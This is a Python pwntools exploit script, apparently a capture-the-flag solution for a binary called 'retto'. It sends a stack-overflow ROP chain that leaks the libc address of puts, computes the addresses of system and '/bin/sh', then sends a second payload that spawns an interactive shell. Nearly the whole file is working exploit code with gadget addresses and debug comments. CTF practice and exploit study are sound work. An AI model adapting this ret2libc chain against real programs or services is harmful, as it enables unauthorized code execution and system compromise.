from pwn import *
import time

#target = remote('cweaccessionsctf.com', '1340')
target = process('./retto')
#gdb.attach(target)
#time.sleep(20)

app_base = 0x400000
libc_offset = 0x11d0
scanf_offset = 0x4028

scanf = p64(0x40115d)
puts = p32(0x4011a5)
csuGadget0 = p64(0x401222)
csuGadget1 = p64(0x401208)
main = p64(0x401165)

initPtr = p64(0x403e38)


print(target.recvline())

#leak = target.recvline()
#leak = leak.decode('utf8').strip(" \n")
#print(leak)
#memAddress = int(leak ,16)
#print(memAddress)
#x0000000000401169
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 0x000000000040122b : pop rdi ; ret
# PTR_puts_00404018
# PUTS addr 00405000
# Puts ref 00401030
# Num:       Value        Size Type    Bind   Vis      Ndx Name
# 1038:      00076170      476 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.0
# 3153:      00048cc0       63 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#payload = ""
payload = b'A'*(56)
payload += b'\x2b\x12\x40\x00\x00\x00\x00\x00' #'\x40\x12\x2b'

payload += b'\x18\x40\x40\x00\x00\x00\x00\x00'
payload += b'\x30\x10\x40\x00\x00\x00\x00\x00'
payload += b'\x65\x11\x40\x00\x00\x00\x00\x00'



print(payload)
#target.sendline(payload)
target.sendline(payload)
print("????")
#print(target.recvline())
libcAddr = target.recvline()
libcAddr = libcAddr.strip()
print(libcAddr)
print("!!!!")
#print(target.recv())

intAddr = int.from_bytes(libcAddr, "little")
#intAddr = intAddr - 0x76170 + 0x48cc0
LIBC = ELF("/lib64/libc.so.6")
LIBC.address = intAddr - LIBC.symbols["puts"]

print(hex(LIBC.address))
BINSH = next(LIBC.search(b"/bin/sh"))
SYSTEM = LIBC.sym["system"]
EXIT = LIBC.sym["exit"]




theGoods = b'A'*(56)
theGoods += b'\x2c\x12\x40\x00\x00\x00\x00\x00' 
theGoods += b'\x2b\x12\x40\x00\x00\x00\x00\x00' #'\x40\x12\x2b'
theGoods += p64(BINSH)
theGoods += p64(SYSTEM)
theGoods += p64(EXIT)




print(target.recvline())
target.sendline(theGoods)


#time.sleep(420)
target.interactive()
target.close()
#while True:	
	#if s.endswith(b'0'):
	#	answer = bytes.fromhex('abf0483b3ddb9cf938b9633aa951d000') #'b8 84 81 0'
	#	r.sendline(answer)


